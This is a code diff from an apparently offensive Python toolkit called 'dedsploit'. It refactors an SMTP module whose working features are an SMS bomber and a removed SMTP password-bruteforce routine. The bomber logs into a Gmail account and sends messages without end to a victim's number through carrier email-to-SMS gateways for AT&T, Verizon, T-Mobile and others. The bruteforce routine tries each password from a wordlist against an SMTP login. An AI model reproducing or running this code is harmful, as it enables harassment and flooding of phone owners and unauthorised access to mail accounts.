@@ -1,33 +1,6 @@
-'''
+from core import *
 
-SMTP Module for dedsploit. Attack vectors include:
-1. SMTP bruteforce
-2. SMS Bomb (using SMTP -> SMS gateway)
-'''
-
-import smtplib
-from core.mainLib import *
-
-
-def smtpBruteforce(address, username, wordlist, port):
-    wordlist = open(wordlist, 'r')
-    for i in wordlist.readlines():
-        password = i.strip("\n")
-        try:
-            s = smtplib.SMTP(str(address), int(port))
-            s.ehlo()
-            s.starttls()
-            s.ehlo
-            s.login(str(username), str(password))
-            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
-            s.close()
-        except Exception, e:
-            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
-        except:
-             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
-             sleep(1)
-
-def smsbomb(phone, attack, email, password):
+def smsbomb_exec(phone, attack, email, password):
     obj = smtplib.SMTP("smtp.gmail.com:587")
     obj.starttls()
     obj.login(email, password)
@@ -39,103 +12,82 @@ def smsbomb(phone, attack, email, password):
          obj.sendmail(email, target, phone_message)
          print G + "[*] Sent! Sending again...Press Ctrl+C to stop!" + W
 
-#######################
-# SMTP Module for dedsploit!
-#######################
-def smtp():
-    print LISTMSG
-    print smtp_menu
-    while True:
-        try:
-            smtp_options = raw_input(LP + "[smtp] >> " + W )
-            if smtp_options == "list": # Print help again
-                print smtp_menu
-            elif smtp_options == "clear":
-                os.system("clear")
-            elif smtp_options == "exit":
+class SMTP(object):
+    def __init__(self, command):
+        self.command = command
+    
+    def smsbomb(self):
+        while True:
+            command = raw_input(LP + "[smtp] smsbomb >> " + W)    
+            try:
+                tokenized = command.split(" ")
+                if tokenized[0] == "target":
+                    phone = tokenized[1]
+                    print "Phone => ", phone
+                    continue
+                elif tokenized[0] == "carrier":
+                    carrier = tokenized[1]
+                    print "Carrier => ", carrier
+                    # Hmm.. lambda calculus?
+                    if carrier == "1":
+                        attack = "@message.alltel.com"
+                    elif carrier == "2":
+                        attack = "@txt.att.net"
+                    elif carrier == "3":
+                        attack = "@myboostmobile.com"
+                    elif carrier == "4":
+                        attack = "@mobile.celloneusa.com"
+                    elif carrier == "5":
+                        attack = "@sms.edgewireless.com"
+                    elif carrier == "6":
+                        attack = "@mymetropcs.com"
+                    elif carrier == "7":
+                        attack == "@messaging.sprintpcs.com"
+                    elif carrier == "8":
+                        attack = "@tmomail.net"
+                    elif carrier == "9":
+                        attack = "@vtext.com"
+                    elif carrier == "10":
+                        attack = "@vmobl.com"
+                    else:
+                        print LO + "[!] If cellular provider was not provided, specify gateway by manually searching it up [!]" + W
+                        print "Carrier => ", attack
+                        continue
+                elif tokenized[0] == "email":
+                    email = tokenized[1]
+                    password = getpass(LC +"[>] What is the password? " + W )
+                    try:
+                        obj = smtplib.SMTP("smtp.gmail.com:587")
+                        obj.starttls()
+                        obj.login(email, password)
+                    except smtplib.SMTPAuthenticationError:
+                        print R + "[!] Credentials not valid! Try again! [!]"
+                        continue
+                    print "Email => ", email
+                    continue
+                elif tokenized[0] == "start":
+                    print "Phone =>", phone, "\nEmail =>", email, "\nCarrier =>", carrier
+                    confirm = raw_input(LC + "[?] Is the information valid? (y/n) " + W)
+                    if (confirm == "y") or (confirm == "yes"):
+                        smsbomb_exec(phone, attack, email, password)
+                    continue
+                elif tokenized[0] == "list":
+                    print LB + "(1) Alltel\n(2) AT&T\n(3) Boost Mobile\n(4) Cellular One\n(5) Edge Wireless\n(6) Metro PCS\n(7) Sprint"
+                    print "(8) T-mobile\n(9) Verizon\n(10) Virgin Mobile" + W
+                    continue
+                elif tokenized[0] == "exit":
+                    break
+            except ValueError:
+                print WARNING
+                continue
+            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                 break
-            elif smtp_options == "bruteforce":
-                print smtpbrute_menu
-                while True:
-                    pre, smtpbrute = raw_input(LP + "[smtp] bruteforce >> " + W).split()
-                    if pre == "target":
-                        smtptarget = smtpbrute
-                        print "Target => ", smtptarget
-                        continue
-                    elif pre == "port":
-                        smtpport = smtpbrute
-                        print "Port => ", smtpport
-                        continue
-                    elif pre == "username":
-                        smtpusername = smtpbrute
-                        print "Username => ", smtpusername
-                        continue
-                    elif pre == "wordlist":
-                        wordlist = smtpbrute
-                        print "Wordlist => ", wordlist
-                        continue
-                    elif pre == "start":
-                        smtpBruteforce(smtptarget, smtpusername, wordlist, smtpport)
-            elif smtp_options == "smsbomb":
-                print sms_menu
-                while True:
-                    pre, smsoptions = raw_input(LP + "[smtp] smsbomb >> " + W ).split()
-                    if pre == "target":
-                        phone = smsoptions
-                        print "Phone => ", phone
-                        continue
-                    elif pre == "carrier":
-                        carrier = smsoptions
-                        print "Carrier => ", carrier
-                        if carrier == "1":
-                            attack = "@message.alltel.com"
-                        if carrier == "2":
-                            attack = "@txt.att.net"
-                        if carrier == "3":
-                            attack = "@myboostmobile.com"
-                        if carrier == "4":
-                            attack = "@mobile.celloneusa.com"
-                        if carrier == "5":
-                            attack = "@sms.edgewireless.com"
-                        if carrier == "6":
-                            attack = "@mymetropcs.com"
-                        if carrier == "7":
-                            attack == "@messaging.sprintpcs.com"
-                        if carrier == "8":
-                            attack = "@tmomail.net"
-                        if carrier == "9":
-                            attack = "@vtext.com"
-                        if carrier == "10":
-                            attack = "@vmobl.com"
-                        else:
-                            print LO + "[!] If cellular provider was not provided, specify gateway by manually searching it up [!]" + W
-                            print "Carrier => ", attack
-                            continue
-                    elif pre == "email":
-                        email = smsoptions
-                        password = getpass(LC +"[>] What is the password? " + W )
-                        try:
-                            obj = smtplib.SMTP("smtp.gmail.com:587")
-                            obj.starttls()
-                            obj.login(email, password)
-                        except smtplib.SMTPAuthenticationError:
-                            print R + "[!] Credentials not valid! Try again! [!]"
-                            continue
-                        print "Email => ", email
-                    elif pre == "start":
-                        smsbomb(phone, attack, email, password)
-
-                    ##### Additional Options #####
-                    elif pre == "list":
-                        if smsoptions == "carriers":
-                            print LB + "(1) Alltel\n(2) AT&T\n(3) Boost Mobile\n(4) Cellular One\n(5) Edge Wireless\n(6) Metro PCS\n(7) Sprint"
-                            print "(8) T-mobile\n(9) Verizon\n(10) Virgin Mobile" + W
-                            continue
-                    elif pre == "exit":
-                        if smsoptions == "smsbomb":
-                            break
-        except ValueError:
-            print WARNING
-            continue
-        except KeyboardInterrupt: # Ctrl + C to go back to main menu
-            break
+            except UnboundLocalError:
+                print R + "[!] Parameters were not set before execution! [!]" + W
+                continue
+                
+    
+    def execute(self):
+        if self.command == "smsbomb":
+            print_command_help(smsbomb_menu)
+            self.smsbomb()
